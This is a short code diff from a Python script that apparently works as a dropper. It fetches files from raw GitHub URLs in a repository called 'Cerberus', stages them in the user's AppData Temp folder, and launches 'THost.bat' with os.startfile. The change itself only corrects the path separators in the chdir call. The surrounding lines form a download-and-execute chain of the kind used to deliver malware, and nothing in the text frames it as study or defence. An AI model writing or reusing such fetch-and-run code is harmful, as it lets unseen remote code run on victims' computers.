@@ -13,6 +13,6 @@ with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerber
 
 #urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/TSource3.txt", "/Users/shrek/AppData/Local/Temp/THost.py")
 
-os.chdir("\Users\shrek\AppData\Local\Temp")
+os.chdir("/Users/shrek/AppData/Local/Temp")
 os.startfile("THost.bat")
 # exec(open("/Users/shrek/AppData/Local/Temp/THost.bat").read())
